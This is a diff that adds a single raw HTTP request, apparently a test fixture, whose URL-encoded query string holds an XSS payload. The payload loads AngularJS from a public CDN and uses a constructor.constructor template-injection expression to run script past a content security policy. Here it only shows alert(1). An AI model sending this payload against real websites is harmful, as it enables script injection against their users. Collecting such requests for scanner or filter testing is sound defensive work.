@@ -1,0 +1,7 @@
+GET /?%3Cscript%20src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js%3E%5Cn%3C/script%3E%3Cx%20ng-app%20ng-csp%3E%7B%7Bconstructor.constructor('alert(1)')()%7D%7D HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
